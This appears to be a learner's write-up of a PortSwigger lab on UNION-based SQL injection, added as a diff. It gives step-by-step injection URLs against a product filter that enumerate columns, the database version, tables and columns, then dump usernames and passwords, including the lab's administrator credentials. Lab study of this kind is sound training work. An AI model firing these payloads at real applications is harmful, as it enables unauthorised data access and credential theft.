@@ -1,0 +1,40 @@
+SQL Injection attack, listing the database contents on non Oracle databases.
+https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-examining-the-database-in-sql-injection-attacks/sql-injection/examining-the-database/listing-the-contents-of-the-database
+https://ranakhalil.teachable.com/courses/1491236/lectures/34259872
+
+Goal: Use sql injection in the product category filter, to retrieve username and password details.
+
+Analysis:
+1) Determine number of columns: e.g. '+Order+By+(n)--  (Increment n until 500 error and number of columns are n-1)
+2) Determine column types: e.g. '+UNION+SELECT+'a',NULL--
+3) Retrieve table information
+4) Retrieve column information
+5) Retrieve user information
+
+Solution:
+1) Number of Columns: 2 
+    /filter?category=Pets'+Order+By+3-- returned 500 error.
+
+2) Determine column types: both are strings
+    /filter?category=Pets'+UNION+SELECT+'a','a'--   Didn't return an 500 error.
+
+3) Determine version of database: PostgreSQL
+    '+UNION+SELECT+%40%40version,+NULL-- (Not Microsoft) 500 internal error.
+    '+UNION+SELECT+version()+NULL-- (Postgre SQL) 200 response.
+
+4) Retrieve table information   
+    /filter?category=Lifestyle'+UNION+SELECT+TABLE_NAME,NULL+FROM+INFORMATION_SCHEMA.TABLES--
+    Users table: users_rxybmq
+
+5) Retrieve column information
+    /filter?category=Lifestyle'+UNION+SELECT+COLUMN_NAME,NULL+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME+%3d+'users_rxybmq'--
+    Columns:
+            -username_jbeiae
+            -password_qredzs
+
+6) Retrieve user information:
+    /filter?category=Pets'+UNION+SELECT+username_jbeiae,password_qredzs+FROM+users_rxybmq-- 
+    User credentials:
+            carlos       |  yroy7tl1ihwzlgimvral
+            wiener       |  u5g200190vl3zi8o4200
+            administrator |  4bftrusnmbvr6q4iydhr
